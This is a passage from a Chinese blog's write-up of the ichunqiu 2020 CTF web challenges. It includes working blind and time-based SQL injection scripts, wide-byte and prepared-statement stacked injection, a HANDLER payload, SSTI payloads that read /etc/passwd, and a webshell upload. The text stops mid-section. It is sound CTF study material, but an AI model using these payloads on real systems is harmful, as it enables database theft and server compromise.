<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ichunqiu新春战疫赛-WriteUp"><meta name="keywords" content="SQL注入,反序列化漏洞,反序列化逃逸漏洞,堆叠注入,SSTI,RSA攻击,bypass functions_disable,RSA共模攻击,时间盲注,宽字节注入,利用正则注入,利用Handler注入,利用预处理语句进行堆叠注入,多列数据爆破注入,PDF417识别,F5隐写,ThinkPHP6.0-通过SEESION写文件漏洞,Rabin算法攻击"><meta name="author" content="ggb0n"><meta name="copyright" content="ggb0n"><title>ichunqiu新春战疫赛-WriteUp | ggb0n's Blog</title><link rel="shortcut icon" href="/avatar.jpg"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-简单的招聘系统"><span class="toc-number">1.</span> <span class="toc-text">Web-简单的招聘系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#解题"><span class="toc-number">1.1.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-ezupload"><span class="toc-number">2.</span> <span class="toc-text">Web-ezupload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-1"><span class="toc-number">2.1.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-盲注"><span class="toc-number">3.</span> <span class="toc-text">Web-盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-2"><span class="toc-number">3.1.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-blacklist"><span class="toc-number">4.</span> <span class="toc-text">Web-blacklist</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-3"><span class="toc-number">4.1.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-easysqli-copy"><span class="toc-number">5.</span> <span class="toc-text">Web-easysqli_copy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析"><span class="toc-number">5.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-4"><span class="toc-number">5.2.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Easqli"><span class="toc-number">6.</span> <span class="toc-text">Web-Easqli</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-1"><span class="toc-number">6.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题脚本"><span class="toc-number">6.2.</span> <span class="toc-text">解题脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-FlaskApp"><span class="toc-number">7.</span> <span class="toc-text">Web-FlaskApp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-2"><span class="toc-number">7.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-5"><span class="toc-number">7.2.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取username"><span class="toc-number">7.2.1.</span> <span class="toc-text">获取username</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取str-uuid-getnode"><span class="toc-number">7.2.2.</span> <span class="toc-text">获取str(uuid.getnode())</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取机器码"><span class="toc-number">7.2.3.</span> <span class="toc-text">获取机器码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-easy-thinking"><span class="toc-number">8.</span> <span class="toc-text">Web-easy_thinking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-3"><span class="toc-number">8.1.</span> <span class="toc-text">题目分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyPHP"><span class="toc-number">9.</span> <span class="toc-text">babyPHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-4"><span class="toc-number">9.1.</span> <span class="toc-text">题目分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-Easy-RSA"><span class="toc-number">10.</span> <span class="toc-text">Crypto-Easy_RSA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-6"><span class="toc-number">10.1.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-warm-up"><span class="toc-number">11.</span> <span class="toc-text">Crypto-warm_up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-5"><span class="toc-number">11.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#补充"><span class="toc-number">11.2.</span> <span class="toc-text">补充</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-code-in-morse"><span class="toc-number">12.</span> <span class="toc-text">Misc-code_in_morse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-6"><span class="toc-number">12.1.</span> <span class="toc-text">题目分析</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="http://www.ggb0n.cool/images/avatar.jpg"></div><div class="author-info__name text-center">ggb0n</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/ggb0n" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">18</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">78</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">8</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Friends Links</div><a class="author-info-links__name text-center" href="https://f61d.github.io" target="_blank" rel="noopener">f61d</a><a class="author-info-links__name text-center" href="https://15h3na0.xyz" target="_blank" rel="noopener">15h3na0</a><a class="author-info-links__name text-center" href="https://sxadmin.github.io" target="_blank" rel="noopener">Myself'</a><a class="author-info-links__name text-center" href="https://diao-diaoupup.cn" target="_blank" rel="noopener">51nd0re1</a><a class="author-info-links__name text-center" href="http://caoyi.site" target="_blank" rel="noopener">Amateur</a><a class="author-info-links__name text-center" href="https://www.cnblogs.com/ph1sh" target="_blank" rel="noopener">ph1sh</a></div></div></div><div id="content-outer"><div class="plain" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">ggb0n's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/links">Friend links</a><a class="site-page" href="/about">About</a><a class="site-page" href="/tools">Tools</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div></div><div class="layout" id="content-inner"><article id="post"><div class="plain" id="post-title">ichunqiu新春战疫赛-WriteUp</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-21</time><span class="post-meta__separator">|</span><i class="fa fa-inbox" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"> CTF学习记录</a><i class="fa fa-angle-right post-meta__separator" aria-hidden="true"></i><i class="fa fa-inbox" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"> 比赛划水</a><span class="post-meta__separator">|</span><span class="post-meta-wordcount"><span>Word count: </span><span class="word-count">6k</span><span class="post-meta__separator">|</span><span>Reading time: 25 min</span></span></div><div class="article-container" id="post-content"><h2 id="Web-简单的招聘系统"><a href="#Web-简单的招聘系统" class="headerlink" title="Web-简单的招聘系统"></a>Web-简单的招聘系统</h2><p>考察SQL注入</p>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>测试发现登录的<code>username</code>处存在注入，万能密码就能登录<br><img src="http://www.ggb0n.cool/images/ichunqiu0.png" alt=""><br>这个地方存在注入点，可以利用盲注爆库，这里利用的思路就是通过判断用户名的条件为<code>true</code>登录进行注入，当然还需要一个现有的用户来登录，那么我们注册个用户就行了，参考如下的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://4b5b40858ffa4258bd74ee72c106522abdc060eb08674169.changame.ichunqiu.com/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2' and (select (mid((select database()),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># payload = "2' and (select (mid((select table_name from information_schema.tables where table_schema='nzhaopin' limit 1 offset 3),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># payload = "2' and (select (mid((select column_name from information_schema.columns where table_name='flag' limit 1 offset 1),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line">payload = <span class="string">"2' and (select (mid((select flaaag from flag limit 1 offset 0),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># backup flag  user           flag: id  flaaag</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">letter = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789_-&#123;&#125;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"lname"</span>: payload.format(i, database + n),</span><br><span class="line">            <span class="string">"lpass"</span>: <span class="string">"xxx"</span></span><br><span class="line">        &#125;</span><br><span class="line">        req = requests.post(url, data=data)</span><br><span class="line">        req.encoding = <span class="string">'gbk'</span></span><br><span class="line">        <span class="comment"># print(req.encoding)</span></span><br><span class="line">        print(data[<span class="string">"lname"</span>])</span><br><span class="line">        <span class="comment"># print(req.text.encode('gbk').decode(req.apparent_encoding))</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"成功"</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text.encode(<span class="string">'gbk'</span>).decode(req.apparent_encoding):</span><br><span class="line">            print(<span class="string">"*                      "</span> + n)</span><br><span class="line">            database += n</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-ezupload"><a href="#Web-ezupload" class="headerlink" title="Web-ezupload"></a>Web-ezupload</h2><p>文件上传题</p>
<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>本以为是一道拐弯的上传题，结果直接传上马了…<br>蚁剑连上，<code>flag</code>文件是空的，但是下面有个<code>/readflag</code>文件，开中断运行这个程序就能拿到flag。<br><img src="http://www.ggb0n.cool/images/ichunqiu2.png" alt=""><br><img src="http://www.ggb0n.cool/images/ichunqiu3.png" alt=""></p>
<h2 id="Web-盲注"><a href="#Web-盲注" class="headerlink" title="Web-盲注"></a>Web-盲注</h2><p>利用正则进行时间盲注</p>
<h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>题目已经说的很明显了，需要进行盲注，但是有waf，过滤了很多常用的注入语句，但是<code>REGEXP</code>并没有被ban，那么利用这个函数很简单地就能拿到flag。<br><code>REGEXP</code>：在列值内进行匹配，如果被匹配的文本在列值中出现，<code>REGEXP</code>将会找到它，相应的行将被返回，<code>REGEXP</code>能匹配整个列值。并且<code>REGEXP</code>检查总是返回<code>0（没有匹配）</code>或<code>1（匹配）</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://49682a5d648a44fe94ba09271ec5fbe569c33f63b1c6435b.changame.ichunqiu.com/?id='</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">letter = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">            payload = <span class="string">'1 and if((fl4g    REGEXP "^&#123;0&#125;"),sleep(3),5);'</span></span><br><span class="line">            payload = payload.format(flag+n)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            req = requests.get(url+payload)</span><br><span class="line">            <span class="comment">#print(req.text)</span></span><br><span class="line">            <span class="keyword">if</span> (time.time() - start_time)&gt;<span class="number">2</span>:</span><br><span class="line">                print(flag)</span><br><span class="line">                flag += n</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-blacklist"><a href="#Web-blacklist" class="headerlink" title="Web-blacklist"></a>Web-blacklist</h2><p>本题是[强网杯]随便注的改版，考察堆叠注入，这题get到注入新姿势，利用<code>mysql</code>数据库中<code>HANDLER</code>绕过黑名单拿flag。</p>
<h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><p>进入题目发现跟强网杯一样的输入框，首先就想到了堆叠注入，测试一下：<br><img src="http://www.ggb0n.cool/images/ichunqiu4.png" alt=""><br>可以看到，语法成功执行了。<br>但是再去测试其他关键字的时候发现很多关键字被ban了：<br><img src="http://www.ggb0n.cool/images/ichunqiu5.png" alt=""><br>本想着利用强网杯的方法，通过改表名来拿flag的，但是<code>rename</code>也被ban了，结合<code>select</code>又被ban，常规的姿势怕是不行，后来借用<code>handler</code>才拿到flag，payload如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">handler</span> FlagHere <span class="keyword">open</span>;<span class="keyword">handler</span> FlagHere <span class="keyword">read</span> <span class="keyword">first</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/ichunqiu6.png" alt=""><br>关于<code>handler</code>可以参考<a href="https://www.jb51.net/article/88732.htm" target="_blank" rel="noopener">这里</a>。</p>
<h2 id="Web-easysqli-copy"><a href="#Web-easysqli-copy" class="headerlink" title="Web-easysqli_copy"></a>Web-easysqli_copy</h2><p>还是考察PDO、check()函数的绕过、实际盲注，不过这题也get到了新姿势：利用<code>预处理语句</code>进行堆叠注入，这也是采用了PDO之后注入的新趋势了。<br>扩展一下知识：</p>
<blockquote>
<p>在php中，<code>PDO</code>有两种模式：<code>模拟预编译</code>与<code>非模拟预编译</code>。默认为模拟预编译模式，即不是真正的预编译，而是采用<code>PDO::quote()</code>函数，首先将用户输入转化为字符型，之后将引号等敏感字符转义。这样在<code>gbk</code>编码下，即可通过宽字节注入绕过防护。<br>但是绕过PDO之后，依然很难绕过<code>check()</code>函数，于是此处利用到了PDO的第二个默认特性：支持<code>多句执行</code>，即可进行堆叠注入。</p>
</blockquote>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目给出了源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i'</span>,$str,$matches))</span><br><span class="line">        &#123;</span><br><span class="line">            print_r($matches);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $db = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=pdotest'</span>,<span class="string">'root'</span>,<span class="string">'******'</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $test = $db-&gt;query(<span class="string">"select balabala from table1"</span>);</span><br><span class="line">        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">        $id = $res[<span class="string">'balabala'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(check($id))</span><br><span class="line">    &#123;</span><br><span class="line">        $query = <span class="string">"select balabala from table1 where 1=?"</span>;</span><br><span class="line">        $db-&gt;query(<span class="string">"set names gbk"</span>);</span><br><span class="line">        $row = $db-&gt;prepare($query);</span><br><span class="line">        $row-&gt;bindParam(<span class="number">1</span>,$id);</span><br><span class="line">        $row-&gt;execute();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>通过源码发现，这里利用了<a href="https://www.runoob.com/php/pdo-query.html" target="_blank" rel="noopener">PDO</a>接口进行与数据库的链接，其中<code>prepare</code>就是准备了一个预处理语句，<code>$row-&gt;bindParam(1,$id);</code>中的<a href="https://www.runoob.com/php/pdostatement-bindparam.html" target="_blank" rel="noopener">binParam</a>作用是绑定一个参数到指定的变量名。<br>请教别的师傅了解到PDO中单引号可能是被自动过滤的，那就只好利用宽字节绕过：<code>%df%27</code>，源码里利用了预处理语句，注入的时候也就选择了利用预处理语句进行注入，同时结合16进制编码绕过对关键字的过滤。</p>
<h3 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h3><p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://96e2f11ccc1147559b9e8c7c9991e494c4dd1d4ca36f4428.changame.ichunqiu.com/?id=1%df%27;'</span></span><br><span class="line">    payloads = <span class="string">"set @a=0x&#123;0&#125;;prepare ctftest from @a; execute ctftest;"</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    letter = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-'</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">        print(<span class="string">"前&#123;0&#125;位"</span>.format(m))</span><br><span class="line">        payload = <span class="string">"select if (ascii(mid((select fllllll4g from table1 ),&#123;0&#125;,1))=&#123;1&#125;, sleep(3), 1)"</span>  <span class="comment"># 由于我们会转换为十六进制，所以不存在任何过滤，关键词随便使用</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">            <span class="comment"># print(payload.format(m, n))</span></span><br><span class="line">            xxx = url + payloads.format(str_to_hex(payload.format(m, ord(n))))</span><br><span class="line">            <span class="comment"># print(xxx)</span></span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(xxx)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">2</span>:</span><br><span class="line">                flag += n</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])  <span class="comment"># 字符串转换为16进制的函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="Web-Easqli"><a href="#Web-Easqli" class="headerlink" title="Web-Easqli"></a>Web-Easqli</h2><p>考察盲注，这题也学到了新姿势：在<code>union select</code>被ban的情况下，进行<code>多列</code>数据的爆破。</p>
<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目是一个大大的输入框，多次尝试发现输入<code>1</code>的时候回显<code>Hello Nu1L</code>，输入<code>0</code>的时候回显<code>hello</code>，后来测试了多个关键字，发现<code>union select</code>单用的时候没问题，联合起来使用怎么都绕不过，<code>or</code>、<code>and</code>也被ban了，但是<code>&amp;&amp;</code>没被ban，这里有搞头，然后测了一下，语句为<code>true</code>回显也是<code>hello Nu1L</code>，就从这里下手了。<br>后来又发现<code>information_schema</code>也被ban了，这时候想到了之前一个题里讲过的：利用mysql系统库<code>sys.schema_table_statistics_with_buffer</code>或者<code>sys.schema_auto_increment_columns</code>获取到了表名，但是因为<code>union select</code>被ban，无列名注入也没法进行，这时候就用到了前面说的学到的新姿势了：利用<code>id=2-(select (select 1,{0})&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))&quot;</code>这样的语句使进行两列的对比，从而爆破出第二列(flag列)的内容。脚本如下：</p>
<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ab8f8551f4dc43a4bc43854950cb1088190a260570ee455c.changame.ichunqiu.com/index.php'</span></span><br><span class="line">headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select database()),1,&#123;0&#125;)='&#123;1&#125;'"</span></span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select table_name from sys.schema_table_statistics_with_buffer where table_schema='ctf' limit 1 offset 1),1,&#123;0&#125;)='&#123;1&#125;'"</span></span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select column_name from sys.schema_auto_increment_columns where table_name='f1ag_1s_h3r3_hhhhh' limit 1),1,&#123;0&#125;)='&#123;1&#125;'" #不可用，需要进行无列名查询</span></span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select * from f1ag_1s_h3r3_hhhhh limit 1),1,&#123;0&#125;)='&#123;1&#125;'" #不可用，因为有两列</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">letter = <span class="string">'0123456789bcdehijkmnopqrstuvwxyz_-&#123;&#125;'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(1, 80):</span></span><br><span class="line"><span class="string">    for n in letter:</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        data = &#123;</span></span><br><span class="line"><span class="string">            "id": payload.format(i, database + n),</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        req = requests.post(url, data=data,headers=headers)</span></span><br><span class="line"><span class="string">        # print(req.text.encode('gbk').decode(req.apparent_encoding))</span></span><br><span class="line"><span class="string">        if "Hello Nu1L" in req.text:</span></span><br><span class="line"><span class="string">            print(n)</span></span><br><span class="line"><span class="string">            flag += n</span></span><br><span class="line"><span class="string">            print(database)</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">                a = chr(i).encode().hex()</span><br><span class="line">                payload = <span class="string">"id=2-(select (select 1,0x%s)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))"</span>%(flag.encode().hex()+a) <span class="comment">#创建两列数据去比较</span></span><br><span class="line">                <span class="comment">#print("Test:"+chr(i))</span></span><br><span class="line">                html = requests.post(url=url,data=payload,headers=headers)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"Hello Nu1L"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">                        flag += chr(i<span class="number">-1</span>)</span><br><span class="line">                        print(<span class="string">"Find:"</span>+flag)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> chr(i) == <span class="string">'&#125;'</span>:</span><br><span class="line">                flag +=<span class="string">'&#125;'</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="Web-FlaskApp"><a href="#Web-FlaskApp" class="headerlink" title="Web-FlaskApp"></a>Web-FlaskApp</h2><p>考察SSTI</p>
<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目发现是一个base64加密解密网站，直接考虑SSTI了。并且这个题跟另外一个利用Flask写的加密的题很像，便参考了那个题的<a href="https://www.anquanke.com/post/id/197602?display=mobile" target="_blank" rel="noopener">解题思路</a>：在开启DEBUG模式的情况下进行模板注入。<br>首先测试一下SSTI是否能用：先在加密页面对<code></code>加密一下，然后到解密页解密，页面回显如下：<br><img src="http://www.ggb0n.cool/images/ichunqiu8.png" alt=""><br>由此得知，确实是SSTI，同时还看到了开启了DEBUG模式。<br>那就利用那道题的解题思路去做吧。</p>
<h3 id="解题-5"><a href="#解题-5" class="headerlink" title="解题"></a>解题</h3><p>参考前面的链接我们知道，这道题可以通过计算出<code>PIN</code>来登录控制台，然后在控制台进行操作拿flag。但是生成<code>PIN</code>的脚本需要知道<code>username</code>(这个需要我们自己去找)、<code>modname</code>(一般是<code>flask.app</code>)、第三个值<code>getattr(app, &quot;__name__&quot;, app.__class__.__name__)</code>(一般是<code>Flask</code>)、第四个值<code>getattr(mod, &quot;__file__&quot;, None)</code>(在报错页面可以看到题目的环境)、第五个是<code>str(uuid.getnode())</code>的值，最后是机器码。<br>报错页面回显如下：<br><img src="http://www.ggb0n.cool/images/ichunqiu9.png" alt=""></p>
<h4 id="获取username"><a href="#获取username" class="headerlink" title="获取username"></a>获取username</h4><p>可以在<code>/etc/passwd</code>中读取到用户名，这里由于题目环境是Python3的，因此读文件需要用如下payload：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">103</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>如果环境是Python2，payload可以构造为：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">2</span>].<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>跟前面的操作一样，先编码，再去解码引发SSTI，回显如下：<br><img src="http://www.ggb0n.cool/images/ichunqiu13.png" alt=""><br>我们看到可以用户名<code>flaskweb</code>，应该就是它了。</p>
<p><code>modename</code>以及第三个、第四个已经知道了，直接去找<code>str(uuid.getnode())</code>的值。</p>
<h4 id="获取str-uuid-getnode"><a href="#获取str-uuid-getnode" class="headerlink" title="获取str(uuid.getnode())"></a>获取str(uuid.getnode())</h4><p>构造payload：</p>
